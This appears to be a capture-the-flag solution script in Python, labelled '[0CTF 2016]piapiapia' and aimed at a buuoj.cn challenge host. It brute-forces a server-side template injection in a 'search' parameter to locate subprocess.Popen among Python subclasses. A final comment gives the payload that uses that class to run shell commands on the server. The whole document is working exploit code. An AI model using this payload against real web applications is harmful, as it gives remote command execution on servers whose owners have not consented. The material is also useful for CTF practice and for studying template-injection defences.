import requests
import html
import time
#[0CTF 2016]piapiapia

for i in range(0,300):
    time.sleep(0.06)
    url='http://50378f09-9774-4111-9c51-4c37d07a0f9d.node5.buuoj.cn:81/?search={{\'\'.__class__.__mro__[2].__subclasses__()[%d]}}' %(i)
    r = requests.get(url)
    print(url)
    if "subprocess.Popen" in html.unescape(r.text):
        print(i)
        break
#之后使用{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}
